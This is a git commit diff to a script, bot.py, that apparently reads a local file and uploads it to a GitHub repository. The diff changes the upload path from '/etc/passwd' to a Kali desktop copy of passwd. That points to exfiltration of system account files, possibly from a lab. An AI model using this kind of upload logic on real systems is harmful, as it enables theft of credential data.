81121a4442db86e142f5a71ca0d4ec36ffc15810
lauraalmrui <83592959+lauraalmrui@users.noreply.github.com>
2024-02-02 15:33:09 +0100

    Update bot.py

--- bot.py
+++ bot.py
@@ -26,7 +26,7 @@ with open('/tmp/file.txt', 'r') as file:
 
 # Upload to github
 git_prefix = 'almacenlar/'
-git_file = git_prefix + '/etc/passwd'
+git_file = git_prefix + '/home/kali/Desktop/passwd'
 if git_file in all_files:
     contents = repo.get_contents(git_file)
     repo.update_file(contents.path, "committing files", content, contents.sha, branch="master")
